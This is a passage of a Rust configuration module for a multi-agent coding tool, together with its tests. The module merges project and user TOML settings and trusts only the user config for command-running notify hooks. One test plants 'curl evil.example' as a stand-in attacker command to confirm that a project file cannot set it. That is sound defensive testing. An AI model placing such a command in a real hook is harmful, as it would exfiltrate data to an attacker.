                self.roles.plan_critic = Some(v.clone());
            }
            if let Some(v) = &r.implementer {
                self.roles.implementer = Some(v.clone());
            }
            if let Some(v) = &r.reviewer {
                self.roles.reviewer = v.clone();
            }
            if let Some(v) = &r.tester {
                self.roles.tester = Some(v.clone());
            }
            if let Some(v) = &r.test_author {
                self.roles.test_author = Some(v.clone());
            }
            self.roles.validate()?;
        }
        if let Some(r) = &file.review {
            if let Some(v) = r.require_all_criteria {
                self.review.require_all_criteria = v;
            }
        }
        if let Some(s) = &file.spec {
            if let Some(v) = s.enabled {
                self.spec.enabled = v;
            }
            if let Some(v) = s.timeout_secs {
                self.spec.timeout_secs = v;
            }
        }
        if let Some(r) = &file.rounds {
            if let Some(v) = r.max {
                self.rounds.max = v;
            }
            if let Some(v) = r.carry_forward_chars {
                self.rounds.carry_forward_chars = v;
            }
        }
        if let Some(g) = &file.gates {
            if let Some(v) = g.plan {
                self.gates.plan = v;
            }
            if let Some(v) = g.winner {
                self.gates.winner = v;
            }
            if let Some(v) = g.ship {
                self.gates.ship = v;
            }
        }
        if let Some(v) = file.autonomy {
            self.autonomy = v;
        }
        if let Some(v) = file.message_budget {
            self.message_budget = v;
        }
        if let Some(v) = file.auto_cleanup {
            self.auto_cleanup = v;
        }
        if let Some(v) = file.auto_reclaim {
            self.auto_reclaim = v;
        }
        if let Some(v) = &file.auto_archive_after {
            // Validated at load, not at use: a bad duration in a shared file should fail
            // the command that reads it, not silently skip archiving forever.
            if !is_archive_off(v) {
                crate::util::parse_duration(v)
                    .with_context(|| format!("[auto_archive_after] {v:?}"))?;
            }
            self.auto_archive_after = v.clone();
        }
        if let Some(ms) = &file.model_select {
            if let Some(v) = &ms.source {
                self.model_select.source = v.clone();
            }
            if let Some(v) = &ms.benches {
                self.model_select.benches = v.clone();
            }
            if let Some(v) = ms.cache_ttl_secs {
                self.model_select.cache_ttl_secs = v;
            }
            if let Some(v) = &ms.allow {
                self.model_select.allow = v.clone();
            }
            if let Some(v) = &ms.profiles {
                for (k, prof) in v {
                    self.model_select.profiles.insert(k.clone(), prof.clone());
                }
            }
            if let Some(v) = &ms.role_profiles {
                for (k, role) in v {
                    self.model_select
                        .role_profiles
                        .insert(k.clone(), role.clone());
                }
            }
            if let Some(v) = ms.auto_refresh {
                self.model_select.auto_refresh = v;
            }
        }
        // [notify] shells out / makes outbound requests, so an untrusted project
        // spar.toml must not supply it — a cloned repo could otherwise run arbitrary
        // commands or exfiltrate message bodies the first time an alert fires. Only
        // the user-level config is trusted for this section.
        if trust == Trust::User {
            if let Some(n) = &file.notify {
                if let Some(v) = &n.command {
                    self.notify.command = Some(v.clone());
                }
                if let Some(v) = &n.webhook {
                    self.notify.webhook = Some(v.clone());
                }
            }
        }
        Ok(())
    }
}

/// Whether a config file is trusted to supply security-sensitive sections like
/// `[notify]`. The user-level config is trusted; a repo-local `spar.toml` is not.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Trust {
    User,
    Project,
}

fn user_config_path() -> Option<PathBuf> {
    dirs::config_dir().map(|d| d.join("spar").join("config.toml"))
}

fn load_file(path: &Path) -> Result<ConfigFile> {
    let text =
        std::fs::read_to_string(path).with_context(|| format!("read config {}", path.display()))?;
    if text.trim().is_empty() {
        return Ok(ConfigFile::default());
    }
    toml::from_str(&text).with_context(|| format!("parse config {}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    /// O52. The ceiling and the carry-forward budget are project-tunable; the defaults
    /// are what every existing project gets without editing anything.
    #[test]
    fn rounds_section_overlays_and_defaults() {
        let tmp = tempdir().unwrap();
        assert_eq!(Config::default().rounds.max, 8);
        assert_eq!(Config::default().rounds.carry_forward_chars, 4000);

        std::fs::write(
            tmp.path().join("spar.toml"),
            "[rounds]\nmax = 4\ncarry_forward_chars = 1500\n",
        )
        .unwrap();
        let cfg = Config::load(tmp.path()).unwrap();
        assert_eq!(cfg.rounds.max, 4);
        assert_eq!(cfg.rounds.carry_forward_chars, 1500);

        // A partial section keeps the other default rather than zeroing it: a
        // `carry_forward_chars = 0` inferred from absence would disable truncation.
        std::fs::write(tmp.path().join("spar.toml"), "[rounds]\nmax = 2\n").unwrap();
        let cfg = Config::load(tmp.path()).unwrap();
        assert_eq!(cfg.rounds.max, 2);
        assert_eq!(cfg.rounds.carry_forward_chars, 4000);
    }

    /// A run reads its own frozen snapshot (O27), so the ceiling has to survive the
    /// round trip through `config.json`.
    #[test]
    fn rounds_survive_the_run_config_snapshot() {
        let tmp = tempdir().unwrap();
        let paths = SparPaths::new(tmp.path());
        let mut cfg = Config::default();
        cfg.rounds.max = 5;
        cfg.rounds.carry_forward_chars = 900;
        cfg.save_snapshot(&paths, "r1").unwrap();
        let bound = Config::for_run(&paths, "r1").unwrap();
        assert_eq!(bound.rounds.max, 5);
        assert_eq!(bound.rounds.carry_forward_chars, 900);
    }

    #[test]
    fn partial_project_overlays_user() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "max_agents = 2\nautonomy = \"high\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.max_agents, 2);
        assert_eq!(cfg.providers.order, default_provider_order());
        assert!(!cfg.ship.auto_confirm);
        assert_eq!(cfg.autonomy, AutonomyLevel::High);
        assert!(cfg.auto_plan());
        assert!(cfg.auto_winner());
        assert!(cfg.suite.enabled);
        assert_eq!(cfg.suite.timeout_secs, 7200);
        assert!(cfg.spec.enabled);
        assert_eq!(cfg.spec.timeout_secs, 3600);
    }

    /// The defaults are the whole design (O50): a soft wall clock at each role's measured
    /// distribution, a ceiling far above it, and per-role token budgets that only nudge.
    #[test]
    fn budget_and_ceiling_defaults_and_overlay() {
        use crate::state::SlotRole;
        let d = Config::default();
        assert_eq!(d.timeouts.slot_secs, 5400, "soft, not the old 1800 kill");
        assert_eq!(
            crate::executor::hard_ceiling_for_role(&d, SlotRole::Implementer).as_secs(),
            16_200,
            "the ceiling is 3x the soft budget, not the budget itself"
        );
        assert_eq!(d.budget.tokens_for(SlotRole::Implementer), 60_000_000);
        assert_eq!(d.budget.tokens_for(SlotRole::Tester), 6_000_000);
        assert_eq!(d.budget.tokens_for(SlotRole::Ranker), d.budget.other);
        assert_eq!(d.budget.nudge_step(SlotRole::Implementer), 12_000_000);

        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[timeouts]
slot_secs = 60
hard_ceiling_multiple = 10.0
nudge_every_secs = 30

[budget]
implementer = 1000
nudge_fraction = 0.5
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(
            crate::executor::hard_ceiling_for_role(&cfg, SlotRole::Implementer).as_secs(),
            600
        );
        assert_eq!(cfg.timeouts.nudge_every_secs, 30);
        assert_eq!(cfg.budget.tokens_for(SlotRole::Implementer), 1000);
        assert_eq!(cfg.budget.nudge_step(SlotRole::Implementer), 500);
        // Untouched roles keep their measured defaults, not the overridden one.
        assert_eq!(cfg.budget.tokens_for(SlotRole::Reviewer), 12_000_000);

        // Disabling the budget silences token nudges without touching the clock.
        let mut off = cfg.clone();
        off.budget.enabled = false;
        assert_eq!(off.budget.tokens_for(SlotRole::Implementer), 0);
        assert_eq!(off.budget.nudge_step(SlotRole::Implementer), u64::MAX);

        // A ceiling below the soft budget clamps rather than killing early.
        let mut low = Config::default();
        low.timeouts.hard_ceiling_multiple = 0.1;
        assert_eq!(
            crate::executor::hard_ceiling_for_role(&low, SlotRole::Implementer).as_secs(),
            low.timeouts.slot_secs
        );
    }

    /// Three roles do **not** draw `timeouts.slot_secs`, and the ceiling multiplies
    /// whichever budget the role actually drew. Getting this wrong is silent: raising
    /// `slot_secs` looks like it covered the fleet while the tester and the test author sit
    /// on untouched numbers, which is exactly how `spec.timeout_secs` kept a ceiling with
    /// zero headroom over its observed max (O51).
    #[test]
    fn each_role_draws_its_own_soft_budget_and_the_ceiling_follows_it() {
        use crate::executor::{hard_ceiling_for_role, timeout_for_role};
        use crate::state::SlotRole;
        let mut cfg = Config::default();
        // Distinct values so a role reading the wrong knob cannot pass by coincidence.
        cfg.timeouts.slot_secs = 100;
        cfg.timeouts.review_secs = Some(200);
        cfg.suite.timeout_secs = 300;
        cfg.spec.timeout_secs = 400;
        cfg.timeouts.hard_ceiling_multiple = 2.0;

        for (role, soft) in [
            (SlotRole::Implementer, 100),
            (SlotRole::Planner, 100),
            (SlotRole::PlanCritic, 100),
            (SlotRole::Reviewer, 200),
            (SlotRole::Tester, 300),
            (SlotRole::TestAuthor, 400),
        ] {
            assert_eq!(
                timeout_for_role(&cfg, role).as_secs(),
                soft,
                "{role:?} soft"
            );
            assert_eq!(
                hard_ceiling_for_role(&cfg, role).as_secs(),
                soft * 2,
                "{role:?} ceiling must multiply its own budget"
            );
        }

        // And the shipped defaults leave the test author real headroom over its observed
        // max of 89.6m, which 1800 did not (its ceiling was 5400s, i.e. exactly the max).
        let d = Config::default();
        assert_eq!(timeout_for_role(&d, SlotRole::TestAuthor).as_secs(), 3600);
        assert_eq!(
            hard_ceiling_for_role(&d, SlotRole::TestAuthor).as_secs(),
            10_800
        );
    }

    #[test]
    fn suite_and_review_timeout_overlay() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[timeouts]
slot_secs = 100
review_secs = 200

[suite]
enabled = false
timeout_secs = 3600

[spec]
enabled = false
timeout_secs = 900

[roles]
tester = "cli:grok"
test_author = "cli:agy"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.timeouts.slot_secs, 100);
        assert_eq!(cfg.timeouts.review_secs(), 200);
        assert!(!cfg.suite.enabled);
        assert_eq!(cfg.suite.timeout_secs, 3600);
        assert!(!cfg.spec.enabled);
        assert_eq!(cfg.spec.timeout_secs, 900);
        assert_eq!(cfg.roles.tester.as_deref(), Some("cli:grok"));
        assert_eq!(cfg.roles.test_author.as_deref(), Some("cli:agy"));
    }

    /// `[suite].command` is what turns the gate deterministic (O54). Empty by default, so
    /// a project that has not declared its suite keeps the agent tester.
    #[test]
    fn suite_command_opts_into_the_builtin_gate() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        assert!(!Config::default().suite.is_builtin());
        std::fs::write(
            project.join("spar.toml"),
            "[suite]\ncommand = [\"cargo fmt --check\", \"cargo test\"]\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.suite.command, vec!["cargo fmt --check", "cargo test"]);
        assert!(cfg.suite.is_builtin());
    }

    /// `enabled = false` turns the channel off whatever the command list says, so one
    /// knob still means one thing.
    #[test]
    fn a_disabled_suite_is_not_builtin() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[suite]\nenabled = false\ncommand = [\"cargo test\"]\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert!(!cfg.suite.is_builtin());
    }

    /// A blank entry would run `sh -c \"\"`, exit 0, and green-light the gate.
    #[test]
    fn a_blank_suite_command_is_a_load_error() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(project.join("spar.toml"), "[suite]\ncommand = [\"\"]\n").unwrap();
        let err = Config::load(project).unwrap_err().to_string();
        assert!(err.contains("[suite].command[0] is empty"), "{err}");
    }

    #[test]
    fn roles_block_overlays() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[roles]
planner = "cli:claude"
plan_critic = "cli:grok"
implementer = "cli:codex@anthropic/claude-opus-4.5"
reviewer = ["cli:grok", "cli:agy", "cli:claude"]
tester = "cli:agy"
test_author = "cli:grok"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(cfg.roles.planner.as_deref(), Some("cli:claude"));
        assert_eq!(cfg.roles.plan_critic.as_deref(), Some("cli:grok"));
        assert_eq!(
            cfg.roles.implementer.as_deref(),
            Some("cli:codex@anthropic/claude-opus-4.5")
        );
        assert_eq!(
            cfg.roles.reviewer,
            vec!["cli:grok", "cli:agy", "cli:claude"]
        );
        assert_eq!(cfg.roles.tester.as_deref(), Some("cli:agy"));
        assert_eq!(cfg.roles.test_author.as_deref(), Some("cli:grok"));
        assert!(!cfg.roles.is_empty());
    }

    #[test]
    fn roles_default_is_empty() {
        assert!(Config::default().roles.is_empty());
    }

    #[test]
    fn roles_reject_bad_ref() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[roles]\nimplementer = \"claude\"\n",
        )
        .unwrap();
        let err = Config::load(project).unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("implementer"),
            "error must name the role key, got: {msg}"
        );
    }

    #[test]
    fn roles_accept_model_ref() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[roles]\nimplementer = \"cli:codex@openai/gpt-4o-mini\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(
            cfg.roles.implementer.as_deref(),
            Some("cli:codex@openai/gpt-4o-mini")
        );
    }

    #[test]
    fn role_profiles_renamed() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            r#"
[model_select.role_profiles]
planner = "value"

[model_select.roles]
planner = "best"
"#,
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert_eq!(
            cfg.model_select
                .role_profiles
                .get("planner")
                .map(|s| s.as_str()),
            Some("value"),
            "the new role_profiles key overlays"
        );
        assert_eq!(
            cfg.model_select.role_profile("planner"),
            "value",
            "old [model_select.roles] key is ignored, no shim"
        );
    }

    #[test]
    fn review_config_defaults_to_strict() {
        assert!(Config::default().review.require_all_criteria);
    }

    #[test]
    fn review_config_overlay() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[review]\nrequire_all_criteria = false\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert!(!cfg.review.require_all_criteria);
    }

    #[test]
    fn project_config_cannot_supply_notify() {
        let tmp = tempdir().unwrap();
        let project = tmp.path();
        std::fs::write(
            project.join("spar.toml"),
            "[notify]\ncommand = \"curl evil.example\"\nwebhook = \"http://evil.example\"\n",
        )
        .unwrap();
        let cfg = Config::load(project).unwrap();
        assert!(
            cfg.notify.command.is_none(),
            "project spar.toml must not set notify.command"
        );
        assert!(
            cfg.notify.webhook.is_none(),
            "project spar.toml must not set notify.webhook"
        );
    }

    #[test]
    fn role_overrides_replace_file_roles() {
        let mut cfg = Config::default();
        cfg.roles.planner = Some("cli:codex".into());
        cfg.roles.reviewer = vec!["cli:codex".into(), "cli:codex".into(), "cli:codex".into()];

        cfg.apply_role_overrides(&[
            "planner=cli:grok".into(),
            "plan_critic=cli:claude@opus".into(),
            "reviewer=cli:grok".into(),
        ])
        .unwrap();

        assert_eq!(cfg.roles.planner.as_deref(), Some("cli:grok"));
        assert_eq!(cfg.roles.plan_critic.as_deref(), Some("cli:claude@opus"));
        assert_eq!(
            cfg.roles.reviewer,
            vec!["cli:grok".to_string()],
            "CLI reviewers replace the file's panel, never append to it"
        );
    }

    #[test]
    fn role_overrides_reject_bad_input() {
        let mut cfg = Config::default();
        assert!(cfg.apply_role_overrides(&["planner".into()]).is_err());
        assert!(cfg.apply_role_overrides(&["nope=cli:grok".into()]).is_err());
        assert!(cfg.apply_role_overrides(&["planner=".into()]).is_err());
        assert!(cfg
            .apply_role_overrides(&["planner=nonsense".into()])
            .is_err());
        // A role the workflow derives is not assignable.
        assert!(cfg
            .apply_role_overrides(&["ranker=cli:grok".into()])
            .is_err());
        assert!(cfg.apply_role_overrides(&[]).is_ok());
    }

    /// The isolation guarantee: once a run is snapshotted, rewriting the project file
    /// cannot reach it. Without this, a second agent's `spar.toml` edit silently changes
    /// the fleet, timeouts and ship-gate strictness of a run already in flight.
    #[test]
    fn run_snapshot_survives_a_rewritten_project_file() {
        let tmp = tempdir().unwrap();
        let paths = SparPaths::new(tmp.path());
        std::fs::write(
            tmp.path().join("spar.toml"),
            "[roles]\nplanner = \"cli:grok\"\n[review]\nrequire_all_criteria = true\n",
        )
        .unwrap();

        let created = Config::load(tmp.path()).unwrap();
        created.save_snapshot(&paths, "run1").unwrap();

        // Another agent rewrites the shared file.
        std::fs::write(
            tmp.path().join("spar.toml"),
            "[roles]\nplanner = \"cli:codex\"\n[review]\nrequire_all_criteria = false\n",
        )
        .unwrap();

        let bound = Config::for_run(&paths, "run1").unwrap();
        assert_eq!(bound.roles.planner.as_deref(), Some("cli:grok"));
        assert!(
            bound.review.require_all_criteria,
            "the ship gate must not loosen under a run in flight"
        );

        // The live file is still what a *new* run would get.
        let fresh = Config::load(tmp.path()).unwrap();
        assert_eq!(fresh.roles.planner.as_deref(), Some("cli:codex"));
    }

    #[test]
    fn run_without_a_snapshot_falls_back_to_the_live_file() {
        let tmp = tempdir().unwrap();
        let paths = SparPaths::new(tmp.path());
        std::fs::write(
            tmp.path().join("spar.toml"),
            "[roles]\nplanner = \"cli:grok\"\n",
        )
        .unwrap();
        // Pre-snapshot runs (created by an older spar) must still load.
        let cfg = Config::for_run(&paths, "legacy-run").unwrap();
        assert_eq!(cfg.roles.planner.as_deref(), Some("cli:grok"));
    }

    #[test]
    fn auto_cleanup_merged_defaults_on_and_is_overridable() {
        assert!(Config::default().worktree.auto_cleanup_merged);
        let file: ConfigFile = toml::from_str("[worktree]\nauto_cleanup_merged = false\n").unwrap();
        let mut cfg = Config::default();
        cfg.apply_file(&file, Trust::Project).unwrap();
        assert!(!cfg.worktree.auto_cleanup_merged);
    }

    #[test]
    fn user_config_supplies_notify() {
        let mut cfg = Config::default();
        let file: ConfigFile = toml::from_str(
            "[notify]\ncommand = \"ntfy publish\"\nwebhook = \"http://hooks.example\"\n",
        )
        .unwrap();
        cfg.apply_file(&file, Trust::User).unwrap();
        assert_eq!(cfg.notify.command.as_deref(), Some("ntfy publish"));
        assert_eq!(cfg.notify.webhook.as_deref(), Some("http://hooks.example"));
    }
}
